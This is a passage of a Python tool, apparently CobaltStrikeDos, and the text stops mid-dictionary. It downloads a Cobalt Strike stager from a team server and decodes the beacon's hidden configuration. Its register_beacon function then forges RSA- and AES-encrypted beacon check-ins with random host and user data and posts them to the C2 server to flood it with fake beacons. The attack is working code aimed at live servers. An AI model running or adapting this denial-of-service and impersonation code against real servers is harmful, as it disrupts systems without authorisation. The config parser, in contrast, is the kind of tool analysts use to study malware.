#!/usr/bin/python3
#https://github.com/JamVayne/CobaltStrikeDos
import base64
import hashlib
import hmac
import io
import json
import os
import sys
import M2Crypto
import pefile
import random
import re
import requests, struct, urllib3
import string
import time
import threading
from Crypto.Cipher import AES
from base64 import b64encode
from collections import OrderedDict
from io import BytesIO
from netstruct import unpack as netunpack
from socket import inet_ntoa
from struct import unpack
from urllib.parse import urljoin


class Metadata(object):
    """
    Class to represent a beacon's metadata.
    This is specific to Cobalt 4 and up
    """

    def __init__(self, public_key, aes_source_bytes):
        """
        Generates a random beacon entry
        Args:
            public_key (bytes): The extracted public key from beacon configuration
            aes_source_bytes (bytes): 16 bytes used to generate AES keys from
        """
        self.public_key = public_key
        self.port = random.randint(40000, 50000)
        self.ciphertext = ""
        self.charset = 20273
        self.ver = random.randint(1, 10)
        self.ip = os.urandom(4)
        self.comp = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
        self.user = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
        self.pid = random.randint(1, 50000) * 4 - 2  # ;)
        self.bid = random.randint(1, 1000000) * 2
        self.barch = 1
        self.is64 = False
        self.high_integrity = False
        self.aes_source_bytes = aes_source_bytes
        self.junk = os.urandom(14)
        d = hashlib.sha256(aes_source_bytes).digest()
        self.aes_key = d[0:16]
        self.hmac_key = d[16:]

    def rsa_encrypt(self, data):
        """Encrypt given data the way Cobalt's server likes

        Args:
            data (bytes): Data to encrypt

        Returns:
            bytes:
        """
        PUBLIC_KEY_TEMPLATE = "-----BEGIN PUBLIC KEY-----\n{}\n-----END PUBLIC KEY-----"
        bio = M2Crypto.BIO.MemoryBuffer(PUBLIC_KEY_TEMPLATE.format(base64.b64encode(self.public_key).decode()).encode())
        pubkey = M2Crypto.RSA.load_pub_key_bio(bio)
        # Format is: magic + dataLength + data
        # beef is the magic used by the server
        packed_data = b'\x00\x00\xBE\xEF' + struct.pack('>I', len(data)) + data
        return pubkey.public_encrypt(packed_data, M2Crypto.RSA.pkcs1_padding)

    def pack(self):
        data = self.aes_source_bytes + struct.pack('>hhIIHBH', self.charset, self.charset, self.bid, self.pid,
                                                   self.port, self.is64, self.ver) + self.junk
        data += struct.pack('4s', self.ip)
        data += b'\x00' * (51 - len(data))
        data += '\t'.join([self.comp, self.user]).encode()
        return self.rsa_encrypt(data)


def mask(arg, data):
    key = os.urandom(4)
    data = data.encode('latin-1')
    return key.decode('latin-1') + ''.join(chr(c ^ key[i % 4]) for i, c in enumerate(data))


def demask(arg, data):
    key = data[:4].encode('latin-1')
    data = data.encode('latin-1')
    return ''.join(chr(c ^ key[i % 4]) for i, c in enumerate(data[4:]))


def netbios_decode(name, case):
    i = iter(name.upper())
    try:
        return ''.join([chr(((ord(c) - ord(case)) << 4) + ((ord(next(i)) - ord(case)) & 0xF)) for c in i])
    except:
        return ''


class Transform(object):
    def __init__(self, trans_dict):
        """An helper class to tranform data according to cobalt's malleable profile

        Args:
            trans_dict (dict): A dictionary that came from packedSetting data. It's in the form of:
                                {'ConstHeaders':[], 'ConstParams': [], 'Metadata': [], 'SessionId': [], 'Output': []}
        """
        self.trans_dict = trans_dict

    def encode(self, metadata, output, sessionId):
        """

        Args:
            metadata (str): The metadata of a Beacon, usually given from Metadata.pack()
            output (str): If this is for a Beacon's response, then this is the response's data
            sessionId (str): the Beacon's ID

        Returns:
            (str, dict, dict): This is to be used in an HTTP request. The tuple is (request_body, request_headers, request_params)
        """
        params = {}
        headers = {}
        body = ''
        for step in self.trans_dict['Metadata']:
            action = step.split(' ')[0].lower()
            arg = step.lstrip(action).strip().strip('"')
            if action in TERMINATION_STEPS:
                if action == "header":
                    headers[arg] = metadata
                elif action == "parameter":
                    params[arg] = metadata
                elif action == "print":
                    body = metadata
            else:
                metadata = func_dict_encode[action](arg, metadata)

        for step in self.trans_dict['Output']:
            action = step.split(' ')[0].lower()
            arg = step.lstrip(action).strip().strip('"')
            if action in TERMINATION_STEPS:
                if action == "header":
                    headers[arg] = output
                elif action == "parameter":
                    params[arg] = output
                elif action == "print":
                    body = output
            else:
                output = func_dict_encode[action](arg, output)

        for step in self.trans_dict['SessionId']:
            action = step.split(' ')[0].lower()
            arg = step.lstrip(action).strip().strip('"')
            if action in TERMINATION_STEPS:
                if action == "header":
                    headers[arg] = sessionId
                elif action == "parameter":
                    params[arg] = sessionId
                elif action == "print":
                    body = sessionId
            else:
                sessionId = func_dict_encode[action](arg, sessionId)

        for step in self.trans_dict['ConstHeaders']:
            offset = step.find(': ')
            header, value = step[:offset], step[offset + 2:]
            headers[header] = value

        for step in self.trans_dict['ConstParams']:
            offset = step.find('=')
            param, value = step[:offset], step[offset + 1:]
            params[param] = value

        return body, headers, params

    def decode(self, body, headers, params):
        """
        Parses beacon's communication data from an HTTP request
        Args:
            body (str): The body of an HTTP request
            headers (dict): Headers dict from the HTTP request
            params (dict): Params dict from the HTTP request

        Returns:
            (str, str, str): The tuple is (metadata, output, sessionId)
        """
        metadata = ''
        output = ''
        sessionId = ''
        for step in self.trans_dict['Metadata'][::-1]:
            action = step.split(' ')[0].lower()
            arg = step.lstrip(action).strip().strip('"')
            if action in TERMINATION_STEPS:
                if action == "header":
                    metadata = headers[arg]
                elif action == "parameter":
                    metadata = params[arg]
                elif action == "print":
                    metadata = body
            else:
                metadata = func_dict_decode[action](arg, metadata)

        for step in self.trans_dict['Output'][::-1]:
            action = step.split(' ')[0].lower()
            arg = step.lstrip(action).strip().strip('"')
            if action in TERMINATION_STEPS:
                if action == "header":
                    output = headers[arg]
                elif action == "parameter":
                    output = params[arg]
                elif action == "print":
                    output = body
            else:
                output = func_dict_decode[action](arg, output)

        for step in self.trans_dict['SessionId'][::-1]:
            action = step.split(' ')[0].lower()
            arg = step.lstrip(action).strip().strip('"')
            if action in TERMINATION_STEPS:
                if action == "header":
                    sessionId = headers[arg]
                elif action == "parameter":
                    sessionId = params[arg]
                elif action == "print":
                    sessionId = body
            else:
                sessionId = func_dict_decode[action](arg, sessionId)

        return metadata, output, sessionId


class Base64Encoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, bytes):
            return b64encode(o).decode()
        return json.JSONEncoder.default(self, o)


def read_dword_be(fh):
    data = fh.read(4)
    if not data or len(data) != 4:
        return None
    return unpack(">I", data)[0]


def decrypt_beacon(buf):
    offset = buf.find(b'\xff\xff\xff')
    if offset == -1:
        _cli_print('[-] Unexpected buffer received')
        return
    offset += 3
    key = struct.unpack_from('<I', buf, offset)[0]
    size = struct.unpack_from('<I', buf, offset + 4)[0] ^ key
    head_enc = struct.unpack_from('<I', buf, offset + 8)[0] ^ key
    head = head_enc & 0xffff

    # Taken directly from L8_get_beacon.py
    if head == 0x5a4d or head == 0x9090:
        decoded_data = b''
        for i in range(2 + offset // 4, len(buf) // 4 - 4):
            a = struct.unpack_from('<I', buf, i * 4)[0]
            b = struct.unpack_from('<I', buf, i * 4 + 4)[0]
            с = a ^ b
            decoded_data += struct.pack('<I', с)
        return decoded_data


def _cli_print(msg, end='\n'):
    print(msg, end=end)


class confConsts:
    MAX_SETTINGS = 64
    TYPE_NONE = 0
    TYPE_SHORT = 1
    TYPE_INT = 2
    TYPE_STR = 3

    START_PATTERNS = {
        3: b'\x69\x68\x69\x68\x69\x6b..\x69\x6b\x69\x68\x69\x6b..\x69\x6a',
        4: b'\x2e\x2f\x2e\x2f\x2e\x2c..\x2e\x2c\x2e\x2f\x2e\x2c..\x2e'
    }
    START_PATTERN_DECODED = b'\x00\x01\x00\x01\x00\x02..\x00\x02\x00\x01\x00\x02..\x00'
    CONFIG_SIZE = 4096
    XORBYTES = {
        3: 0x69,
        4: 0x2e
    }


class packedSetting:

    def __init__(self, pos, datatype, length=0, isBlob=False, isHeaders=False, isIpAddress=False, isBool=False,
                 isDate=False, boolFalseValue=0, isProcInjectTransform=False, isMalleableStream=False, hashBlob=False,
                 enum=None, mask=None):
        self.pos = pos
        self.datatype = datatype
        self.is_blob = isBlob
        self.is_headers = isHeaders
        self.is_ipaddress = isIpAddress
        self.is_bool = isBool
        self.is_date = isDate
        self.is_malleable_stream = isMalleableStream
        self.bool_false_value = boolFalseValue
        self.is_transform = isProcInjectTransform
        self.hashBlob = hashBlob
        self.enum = enum
        self.mask = mask
        self.transform_get = None
        self.transform_post = None
        if datatype == confConsts.TYPE_STR and length == 0:
            raise (Exception("if datatype is TYPE_STR then length must not be 0"))

        self.length = length
        if datatype == confConsts.TYPE_SHORT:
            self.length = 2
        elif datatype == confConsts.TYPE_INT:
            self.length = 4

    def binary_repr(self):
        """
        Param number - Type - Length - Value
        """
        self_repr = bytearray(6)
        self_repr[1] = self.pos
        self_repr[3] = self.datatype
        self_repr[4:6] = self.length.to_bytes(2, 'big')
        return self_repr

    def parse_transformdata(self, data):
        '''
        Args:
            data (bytes): Raw communication transforam data

        Returns:
            dict: Dict of transform commands that should be convenient for communication forging

        '''
        dio = io.BytesIO(data)
        trans = {'ConstHeaders': [], 'ConstParams': [], 'Metadata': [], 'SessionId': [], 'Output': []}
        current_category = 'Constants'

        # TODO: replace all magic numbers here with enum
        while True:
            tstep = read_dword_be(dio)
            if tstep == 7:
                name = read_dword_be(dio)
                if self.pos == 12:  # GET
                    current_category = 'Metadata'
                else:  # POST
                    current_category = 'SessionId' if name == 0 else 'Output'
            elif tstep in (1, 2, 5, 6):
                length = read_dword_be(dio)
                step_data = dio.read(length).decode()
                trans[current_category].append(BeaconSettings.TSTEPS[tstep] + ' "' + step_data + '"')
            elif tstep in (10, 16, 9):
                length = read_dword_be(dio)
                step_data = dio.read(length).decode()
                if tstep == 9:
                    trans['ConstParams'].append(step_data)
                else:
                    trans['ConstHeaders'].append(step_data)
            elif tstep in (3, 4, 13, 8, 11, 12, 15):
                trans[current_category].append(BeaconSettings.TSTEPS[tstep])
            else:
                break

        if self.pos == 12:
            self.transform_get = trans
        else:
            self.transform_post = trans

        return trans

    def pretty_repr(self, full_config_data):
        data_offset = full_config_data.find(self.binary_repr())
        if data_offset < 0 and self.datatype == confConsts.TYPE_STR:
            self.length = 16
            while self.length < 2048:
                data_offset = full_config_data.find(self.binary_repr())
                if data_offset > 0:
                    break
                self.length *= 2

        if data_offset < 0:
            return 'Not Found'

        repr_len = len(self.binary_repr())
        conf_data = full_config_data[data_offset + repr_len: data_offset + repr_len + self.length]
        if self.datatype == confConsts.TYPE_SHORT:
            conf_data = unpack('>H', conf_data)[0]
            if self.is_bool:
                ret = 'False' if conf_data == self.bool_false_value else 'True'
                return ret
            elif self.enum:
                return self.enum[conf_data]
            elif self.mask:
                ret_arr = []
                for k, v in self.mask.items():
                    if k == 0 and k == conf_data:
                        ret_arr.append(v)
                    if k & conf_data:
                        ret_arr.append(v)
                return ret_arr
            else:
                return conf_data

        elif self.datatype == confConsts.TYPE_INT:
            if self.is_ipaddress:
                return inet_ntoa(conf_data)

            else:
                conf_data = unpack('>i', conf_data)[0]
                if self.is_date and conf_data != 0:
                    fulldate = str(conf_data)
                    return "%s-%s-%s" % (fulldate[0:4], fulldate[4:6], fulldate[6:])

                return conf_data

        if self.is_blob:
            if self.enum != None:
                ret_arr = []
                i = 0
                while i < len(conf_data):
                    v = conf_data[i]
                    if v == 0:
                        return ret_arr
                    v = self.enum[v]
                    if v:
                        ret_arr.append(v)
                        i += 1

                    # Only EXECUTE_TYPE for now
                    else:
                        # Skipping unknown short value in the start
                        string1 = netunpack(b'I$', conf_data[i + 3:])[0].decode()
                        string2 = netunpack(b'I$', conf_data[i + 3 + 4 + len(string1):])[0].decode()
                        ret_arr.append("%s:%s" % (string1.strip('\x00'), string2.strip('\x00')))
                        i += len(string1) + len(string2) + 11

            if self.is_transform:
                if conf_data == bytes(len(conf_data)):
                    return 'Empty'

                ret_arr = []
                prepend_length = unpack('>I', conf_data[0:4])[0]
                prepend = conf_data[4: 4 + prepend_length]
                append_length_offset = prepend_length + 4
                append_length = unpack('>I', conf_data[append_length_offset: append_length_offset + 4])[0]
                append = conf_data[append_length_offset + 4: append_length_offset + 4 + append_length]
                ret_arr.append(prepend)
                ret_arr.append(append if append_length < 256 and append != bytes(append_length) else 'Empty')
                return ret_arr

            if self.is_malleable_stream:
                prog = []
                fh = io.BytesIO(conf_data)
                while True:
                    op = read_dword_be(fh)
                    if not op:
                        break
                    if op == 1:
                        l = read_dword_be(fh)
                        prog.append("Remove %d bytes from the end" % l)
                    elif op == 2:
                        l = read_dword_be(fh)
                        prog.append("Remove %d bytes from the beginning" % l)
                    elif op == 3:
                        prog.append("Base64 decode")
                    elif op == 8:
                        prog.append("NetBIOS decode 'a'")
                    elif op == 11:
                        prog.append("NetBIOS decode 'A'")
                    elif op == 13:
                        prog.append("Base64 URL-safe decode")
                    elif op == 15:
                        prog.append("XOR mask w/ random key")

                conf_data = prog
            if self.hashBlob:
                conf_data = conf_data.strip(b'\x00')
                conf_data = hashlib.md5(conf_data).hexdigest()

            return conf_data

        if self.is_headers:
            return self.parse_transformdata(conf_data)

        conf_data = conf_data.strip(b'\x00').decode()
        return conf_data


class BeaconSettings:
    BEACON_TYPE = {0x0: "HTTP", 0x1: "Hybrid HTTP DNS", 0x2: "SMB", 0x4: "TCP", 0x8: "HTTPS", 0x10: "Bind TCP"}
    ACCESS_TYPE = {0x1: "Use direct connection", 0x2: "Use IE settings", 0x4: "Use proxy server"}
    EXECUTE_TYPE = {0x1: "CreateThread", 0x2: "SetThreadContext", 0x3: "CreateRemoteThread", 0x4: "RtlCreateUserThread",
                    0x5: "NtQueueApcThread", 0x6: None, 0x7: None, 0x8: "NtQueueApcThread-s"}
    ALLOCATION_FUNCTIONS = {0: "VirtualAllocEx", 1: "NtMapViewOfSection"}
    TSTEPS = {1: "append", 2: "prepend", 3: "base64", 4: "print", 5: "parameter", 6: "header", 7: "build", 8: "netbios",
              9: "const_parameter", 10: "const_header", 11: "netbiosu", 12: "uri_append", 13: "base64url", 14: "strrep",
              15: "mask", 16: "const_host_header"}
    ROTATE_STRATEGY = ["round-robin", "random", "failover", "failover-5x", "failover-50x", "failover-100x",
                       "failover-1m", "failover-5m", "failover-15m", "failover-30m", "failover-1h", "failover-3h",
                       "failover-6h", "failover-12h", "failover-1d", "rotate-1m", "rotate-5m", "rotate-15m",
                       "rotate-30m", "rotate-1h", "rotate-3h", "rotate-6h", "rotate-12h", "rotate-1d"]

    def __init__(self, version):
        if version not in SUPPORTED_VERSIONS:
            _cli_print("Error: Only supports version 3 and 4, not %d" % version)
            return
        self.version = version
        self.settings = OrderedDict()
        self.init()

    def init(self):
        self.settings['BeaconType'] = packedSetting(1, confConsts.TYPE_SHORT, mask=self.BEACON_TYPE)
        self.settings['Port'] = packedSetting(2, confConsts.TYPE_SHORT)
        self.settings['SleepTime'] = packedSetting(3, confConsts.TYPE_INT)
        self.settings['MaxGetSize'] = packedSetting(4, confConsts.TYPE_INT)
        self.settings['Jitter'] = packedSetting(5, confConsts.TYPE_SHORT)
        self.settings['MaxDNS'] = packedSetting(6, confConsts.TYPE_SHORT)
        # Silenced config
        self.settings['PublicKey'] = packedSetting(7, confConsts.TYPE_STR, 256, isBlob=True)
        self.settings['PublicKey_MD5'] = packedSetting(7, confConsts.TYPE_STR, 256, isBlob=True, hashBlob=True)
        self.settings['C2Server'] = packedSetting(8, confConsts.TYPE_STR, 256)
        self.settings['UserAgent'] = packedSetting(9, confConsts.TYPE_STR, 128)
        # TODO: Concat with C2Server?
        self.settings['HttpPostUri'] = packedSetting(10, confConsts.TYPE_STR, 64)

        # This is how the server transforms its communication to the beacon
        # ref: https://www.cobaltstrike.com/help-malleable-c2 | https://usualsuspect.re/article/cobalt-strikes-malleable-c2-under-the-hood
        # TODO: Switch to isHeaders parser logic
        self.settings['Malleable_C2_Instructions'] = packedSetting(11, confConsts.TYPE_STR, 256, isBlob=True,
                                                                   isMalleableStream=True)
        # This is the way the beacon transforms its communication to the server
        # TODO: Change name to HttpGet_Client and HttpPost_Client
        self.settings['HttpGet_Metadata'] = packedSetting(12, confConsts.TYPE_STR, 256, isHeaders=True)
        self.settings['HttpPost_Metadata'] = packedSetting(13, confConsts.TYPE_STR, 256, isHeaders=True)

        self.settings['SpawnTo'] = packedSetting(14, confConsts.TYPE_STR, 16, isBlob=True)
        self.settings['PipeName'] = packedSetting(15, confConsts.TYPE_STR, 128)
        # Options 16-18 are deprecated in 3.4
        self.settings['DNS_Idle'] = packedSetting(19, confConsts.TYPE_INT, isIpAddress=True)
        self.settings['DNS_Sleep'] = packedSetting(20, confConsts.TYPE_INT)
        # Options 21-25 are for SSHAgent
        self.settings['SSH_Host'] = packedSetting(21, confConsts.TYPE_STR, 256)
        self.settings['SSH_Port'] = packedSetting(22, confConsts.TYPE_SHORT)
        self.settings['SSH_Username'] = packedSetting(23, confConsts.TYPE_STR, 128)
        self.settings['SSH_Password_Plaintext'] = packedSetting(24, confConsts.TYPE_STR, 128)
        self.settings['SSH_Password_Pubkey'] = packedSetting(25, confConsts.TYPE_STR, 6144)
        self.settings['SSH_Banner'] = packedSetting(54, confConsts.TYPE_STR, 128)

        self.settings['HttpGet_Verb'] = packedSetting(26, confConsts.TYPE_STR, 16)
        self.settings['HttpPost_Verb'] = packedSetting(27, confConsts.TYPE_STR, 16)
        self.settings['HttpPostChunk'] = packedSetting(28, confConsts.TYPE_INT)
        self.settings['Spawnto_x86'] = packedSetting(29, confConsts.TYPE_STR, 64)
        self.settings['Spawnto_x64'] = packedSetting(30, confConsts.TYPE_STR, 64)
        # Whether the beacon encrypts his communication, should be always on (1) in beacon 4
        self.settings['CryptoScheme'] = packedSetting(31, confConsts.TYPE_SHORT)
        self.settings['Proxy_Config'] = packedSetting(32, confConsts.TYPE_STR, 128)
        self.settings['Proxy_User'] = packedSetting(33, confConsts.TYPE_STR, 64)
        self.settings['Proxy_Password'] = packedSetting(34, confConsts.TYPE_STR, 64)
        self.settings['Proxy_Behavior'] = packedSetting(35, confConsts.TYPE_SHORT, enum=self.ACCESS_TYPE)
        # Option 36 is deprecated
        self.settings['Watermark'] = packedSetting(37, confConsts.TYPE_INT)
        self.settings['bStageCleanup'] = packedSetting(38, confConsts.TYPE_SHORT, isBool=True)
        self.settings['bCFGCaution'] = packedSetting(39, confConsts.TYPE_SHORT, isBool=True)
        self.settings['KillDate'] = packedSetting(40, confConsts.TYPE_INT, isDate=True)
        # Inner parameter, does not seem interesting so silencing
        # self.settings['textSectionEnd (0 if !sleep_mask)'] = packedSetting(41, confConsts.TYPE_INT)

        # TODO: dynamic size parsing
        # self.settings['ObfuscateSectionsInfo'] = packedSetting(42, confConsts.TYPE_STR, %d, isBlob=True)
        self.settings['bProcInject_StartRWX'] = packedSetting(43, confConsts.TYPE_SHORT, isBool=True, boolFalseValue=4)
        self.settings['bProcInject_UseRWX'] = packedSetting(44, confConsts.TYPE_SHORT, isBool=True, boolFalseValue=32)
        self.settings['bProcInject_MinAllocSize'] = packedSetting(45, confConsts.TYPE_INT)
        self.settings['ProcInject_PrependAppend_x86'] = packedSetting(46, confConsts.TYPE_STR, 256, isBlob=True,
                                                                      isProcInjectTransform=True)
        self.settings['ProcInject_PrependAppend_x64'] = packedSetting(47, confConsts.TYPE_STR, 256, isBlob=True,
                                                                      isProcInjectTransform=True)
        self.settings['ProcInject_Execute'] = packedSetting(51, confConsts.TYPE_STR, 128, isBlob=True,
                                                            enum=self.EXECUTE_TYPE)
        # If True then allocation is using NtMapViewOfSection
        self.settings['ProcInject_AllocationMethod'] = packedSetting(52, confConsts.TYPE_SHORT,
                                                                     enum=self.ALLOCATION_FUNCTIONS)

        # Unknown data, silenced for now
        self.settings['ProcInject_Stub'] = packedSetting(53, confConsts.TYPE_STR, 16, isBlob=True)
        self.settings['bUsesCookies'] = packedSetting(50, confConsts.TYPE_SHORT, isBool=True)
        self.settings['HostHeader'] = packedSetting(54, confConsts.TYPE_STR, 128)

        # Silenced as I've yet to test it on a sample with those options
        self.settings['smbFrameHeader'] = packedSetting(57, confConsts.TYPE_STR, 128, isBlob=True)
        self.settings['tcpFrameHeader'] = packedSetting(58, confConsts.TYPE_STR, 128, isBlob=True)
        self.settings['headersToRemove'] = packedSetting(59, confConsts.TYPE_STR, 64)

        # DNS Beacon
        self.settings['DNS_Beaconing'] = packedSetting(60, confConsts.TYPE_STR, 33)
        self.settings['DNS_get_TypeA'] = packedSetting(61, confConsts.TYPE_STR, 33)
        self.settings['DNS_get_TypeAAAA'] = packedSetting(62, confConsts.TYPE_STR, 33)
        self.settings['DNS_get_TypeTXT'] = packedSetting(63, confConsts.TYPE_STR, 33)
        self.settings['DNS_put_metadata'] = packedSetting(64, confConsts.TYPE_STR, 33)
        self.settings['DNS_put_output'] = packedSetting(65, confConsts.TYPE_STR, 33)
        self.settings['DNS_resolver'] = packedSetting(66, confConsts.TYPE_STR, 15)
        self.settings['DNS_strategy'] = packedSetting(67, confConsts.TYPE_SHORT, enum=self.ROTATE_STRATEGY)
        self.settings['DNS_strategy_rotate_seconds'] = packedSetting(68, confConsts.TYPE_INT)
        self.settings['DNS_strategy_fail_x'] = packedSetting(69, confConsts.TYPE_INT)
        self.settings['DNS_strategy_fail_seconds'] = packedSetting(70, confConsts.TYPE_INT)


class cobaltstrikeConfig:
    def __init__(self, f):
        '''
        f: file path or file-like object
        '''
        self.data = None
        if isinstance(f, str):
            with open(f, 'rb') as fobj:
                self.data = fobj.read()
        else:
            self.data = f.read()

    """Parse the CobaltStrike configuration"""

    @staticmethod
    def decode_config(cfg_blob, version):
        return bytes([cfg_offset ^ confConsts.XORBYTES[version] for cfg_offset in cfg_blob])

    def _parse_config(self, version, quiet=False, as_json=False):
        '''
        Parses beacon's configuration from beacon PE or memory dump.
        Returns json of config is found; else it returns None.

        :int version: Try a specific version (3 or 4), or leave None to try both of them
        :bool quiet: Whether to print missing or empty settings
        :bool as_json: Whether to dump as json
        '''
        re_start_match = re.search(confConsts.START_PATTERNS[version], self.data)
        re_start_decoded_match = re.search(confConsts.START_PATTERN_DECODED, self.data)

        if not re_start_match and not re_start_decoded_match:
            return None
        encoded_config_offset = re_start_match.start() if re_start_match else -1
        decoded_config_offset = re_start_decoded_match.start() if re_start_decoded_match else -1

        if encoded_config_offset >= 0:
            full_config_data = cobaltstrikeConfig.decode_config(
                self.data[encoded_config_offset: encoded_config_offset + confConsts.CONFIG_SIZE], version=version)
        else:
            full_config_data = self.data[decoded_config_offset: decoded_config_offset + confConsts.CONFIG_SIZE]

        parsed_config = {}
        settings = BeaconSettings(version).settings.items()
        for conf_name, packed_conf in settings:
            parsed_setting = packed_conf.pretty_repr(full_config_data)

            parsed_config[conf_name] = parsed_setting
            if as_json:
                continue

            if conf_name in SILENT_CONFIGS:
                continue

            if parsed_setting == 'Not Found' and quiet:
                continue

            conf_type = type(parsed_setting)
            if conf_type in (str, int, bytes):
                if quiet and conf_type == str and parsed_setting.strip() == '':
                    continue
                _cli_print("{: <{width}} - {val}".format(conf_name, width=COLUMN_WIDTH - 3, val=parsed_setting))

            elif parsed_setting == []:
                if quiet:
                    continue
                _cli_print("{: <{width}} - {val}".format(conf_name, width=COLUMN_WIDTH - 3, val='Empty'))

            elif conf_type == dict:  # the beautifulest code
                conf_data = []
                for k in parsed_setting.keys():
                    if parsed_setting[k]:
                        conf_data.append(k)
                        for v in parsed_setting[k]:
                            conf_data.append('\t' + v)
                if not conf_data:
                    continue
                _cli_print("{: <{width}} - {val}".format(conf_name, width=COLUMN_WIDTH - 3, val=conf_data[0]))
                for val in conf_data[1:]:
                    _cli_print(' ' * COLUMN_WIDTH, end='')
                    _cli_print(val)

            elif conf_type == list:  # list
                _cli_print("{: <{width}} - {val}".format(conf_name, width=COLUMN_WIDTH - 3, val=parsed_setting[0]))
                for val in parsed_setting[1:]:
                    _cli_print(' ' * COLUMN_WIDTH, end='')
                    _cli_print(val)

        if as_json:
            _cli_print(json.dumps(parsed_config, cls=Base64Encoder))

        return parsed_config

    def parse_config(self, version=None, quiet=False, as_json=False):
        '''
        Parses beacon's configuration from beacon PE or memory dump
        Returns json of config is found; else it returns None.

        :int version: Try a specific version (3 or 4), or leave None to try both of them
        :bool quiet: Whether to print missing or empty settings
        :bool as_json: Whether to dump as json
        '''

        if not version:
            for ver in SUPPORTED_VERSIONS:
                parsed = self._parse_config(version=ver, quiet=quiet, as_json=as_json)
                if parsed:
                    return parsed
        else:
            return self._parse_config(version=version, quiet=quiet, as_json=as_json)
        return None

    def parse_encrypted_config_non_pe(self, version=None, quiet=False, as_json=False):
        self.data = decrypt_beacon(self.data)
        return self.parse_config(version=version, quiet=quiet, as_json=as_json)

    def parse_encrypted_config(self, version=None, quiet=False, as_json=False):
        '''
        Parses beacon's configuration from stager dll or memory dump
        Returns json of config is found; else it returns None.

        :bool quiet: Whether to print missing settings
        :bool as_json: Whether to dump as json
        '''

        try:
            pe = pefile.PE(data=self.data)
        except pefile.PEFormatError:
            return self.parse_encrypted_config_non_pe(version=version, quiet=quiet, as_json=as_json)

        data_sections = [s for s in pe.sections if s.Name.find(b'.data') != -1]
        if not data_sections:
            _cli_print("Failed to find .data section")
            return False
        data = data_sections[0].get_data()

        offset = 0
        key_found = False
        while offset < len(data):
            key = data[offset:offset + 4]
            if key != bytes(4):
                if data.count(key) >= THRESHOLD:
                    key_found = True
                    size = int.from_bytes(data[offset - 4:offset], 'little')
                    encrypted_data_offset = offset + 16 - (offset % 16)
                    break

            offset += 4

        if not key_found:
            return False

        # decrypt
        enc_data = data[encrypted_data_offset:encrypted_data_offset + size]
        dec_data = []
        for i, c in enumerate(enc_data):
            dec_data.append(c ^ key[i % 4])

        dec_data = bytes(dec_data)
        self.data = dec_data
        return self.parse_config(version=version, quiet=quiet, as_json=as_json)


def register_beacon(conf, random_data):
    try:
        urljoin(http_method + conf['C2Server'].split(',')[0] + req_port, conf['C2Server'].split(',')[1])
        aes_source = os.urandom(16)
        m = Metadata(conf['PublicKey'], aes_source)
        t = Transform(conf['HttpGet_Metadata'])
        body, headers, params = t.encode(m.pack().decode('latin-1'), '', str(m.bid))
        requests.request('GET',
                         urljoin(http_method + conf['C2Server'].split(',')[0] + req_port,
                                 conf['C2Server'].split(',')[1]),
                         params=params, data=body, headers=dict(**headers, **{'User-Agent': ''}), timeout=1,
                         verify=False)
        data = struct.pack('>II', 1, len(random_data)) + random_data
        pad_size = AES.block_size - len(data) % AES.block_size
        data = data + pad_size * b'\x00'
        cipher = AES.new(m.aes_key, AES.MODE_CBC, CS_FIXED_IV)
        enc_data = cipher.encrypt(data)
        sig = hmac.new(m.hmac_key, enc_data, HASH_ALGO).digest()[0:16]
        enc_data += sig
        enc_data = struct.pack('>I', len(enc_data)) + enc_data
        t = Transform(conf['HttpPost_Metadata'])
        body, headers, params = t.encode(m.pack().decode('latin-1'), enc_data.decode('latin-1'), str(m.bid))
        requests.request('POST',
                         urljoin(http_method + conf['C2Server'].split(',')[0] + req_port,
                                 conf['HttpPostUri'].split(',')[0]),
                         params=params, data=body, headers=dict(**headers, **{'User-Agent': ''}), timeout=1,
                         verify=False)
    except:
        pass


def get_beacon_data(url, arch):
    full_url = urljoin(url, URL_PATHS[arch])
    try:
        resp = requests.get(full_url, timeout=30, headers=EMPTY_UA_HEADERS, verify=False)
    except requests.exceptions.RequestException as e:
        print('[-] Connection error: ', e)
        return

    if resp.status_code != 200:
        print('[-] Failed with HTTP status code: ', resp.status_code)
        return

    buf = resp.content

    # Check if it's a Trial beacon, therefore not xor encoded (not tested)
    eicar_offset = buf.find(b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE')
    if eicar_offset != -1:
        return cobaltstrikeConfig(BytesIO(buf)).parse_config()

    offset = buf.find(b'\xff\xff\xff')
    if offset == -1:
        print('[-] Unexpected buffer received')
        return
    offset += 3
    key = struct.unpack_from('<I', buf, offset)[0]
    size = struct.unpack_from('<I', buf, offset + 4)[0] ^ key
    head_enc = struct.unpack_from('<I', buf, offset + 8)[0] ^ key
    head = head_enc & 0xffff
    if head == 0x5a4d or head == 0x9090:
        decoded_data = b''
        for i in range(2 + offset // 4, len(buf) // 4 - 4):
            a = struct.unpack_from('<I', buf, i * 4)[0]
            b = struct.unpack_from('<I', buf, i * 4 + 4)[0]
            с = a ^ b
            decoded_data += struct.pack('<I', с)

        return cobaltstrikeConfig(BytesIO(decoded_data)).parse_config()


if __name__ == '__main__':
    start_time = time.time()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    if len(sys.argv) == 1:
        print('Usage: python3 CobaltStrike.py https://1.1.1.1<:443> <stager path>')
        exit()
    argv_path = str(sys.argv[2]) if len(sys.argv) == 3 else ''
    argv_url = str(sys.argv[1])
    try:
        sto = requests.get(argv_url, timeout=60, verify=False).elapsed.seconds
    except:
        print('[-] Could Not Connect To C2 Server')
        exit()
    print("[+] Try Get beacon configuration")
    TERMINATION_STEPS = ['header', 'parameter', 'print']
    TSTEPS = {1: "append", 2: "prepend", 3: "base64", 4: "print", 5: "parameter", 6: "header", 7: "build", 8: "netbios",
              9: "const_parameter", 10: "const_header", 11: "netbiosu", 12: "uri_append", 13: "base64url", 14: "strrep",
              15: "mask", 16: "const_host_header"}
    func_dict_encode = {"append": lambda arg, data: data + arg,
                        "prepend": lambda arg, data: arg + data,
                        "base64": lambda arg, data: base64.b64encode(data),
                        "netbios": lambda arg, data: ''.join(
                            [chr((ord(c) >> 4) + ord('a')) + chr((ord(c) & 0xF) + ord('a')) for c in data]),
                        "netbiosu": lambda arg, data: ''.join(
                            [chr((ord(c) >> 4) + ord('A')) + chr((ord(c) & 0xF) + ord('A')) for c in data]),
                        "base64": lambda arg, data: base64.b64encode(data.encode('latin-1')).decode('latin-1'),
                        "base64url": lambda arg, data: base64.urlsafe_b64encode(data.encode('latin-1')).decode(
                            'latin-1').strip('='),
